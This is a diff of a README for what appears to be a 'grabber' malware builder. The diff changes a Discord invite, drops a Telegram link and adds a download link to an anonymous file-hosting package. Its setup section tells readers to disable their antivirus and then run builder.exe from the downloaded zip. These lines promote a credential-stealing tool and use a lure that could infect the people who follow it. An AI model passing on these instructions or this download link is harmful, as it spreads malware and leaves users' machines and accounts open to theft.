@@ -7,11 +7,8 @@
 </h1>
 
 <div align="center" style="background-color: #da467d; padding: 20px;">
-    <a href="https://discord.gg/sMawrDqnta">
+    <a href="https://discord.gg/659s5KQR7M">
         <img src="https://img.shields.io/badge/Discord-%23FF0060.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
-    </a>
-    <a href="https://t.me/rosegrabber">
-        <img src="https://img.shields.io/badge/Telegram-%23FF0060.svg?style=for-the-badge&logo=telegram&logoColor=white" alt="Join our Telegram">
     </a>
     <br>
     <br>
@@ -87,7 +84,7 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 ### Setup
 
 **Before proceeding, briefly disable your antivirus to avoid accidental removal of important components. Install Python properly, ensuring it's added to PATH. Preferably, use Python 3.11 and uninstall other versions. Thanks!**
-- Download repository
+- Download repository [here](https://filetransfer.io/data-package/TcLZ5qnY#link)
 - Extract the zip file.
 - Launch UI by executing builder.exe
 
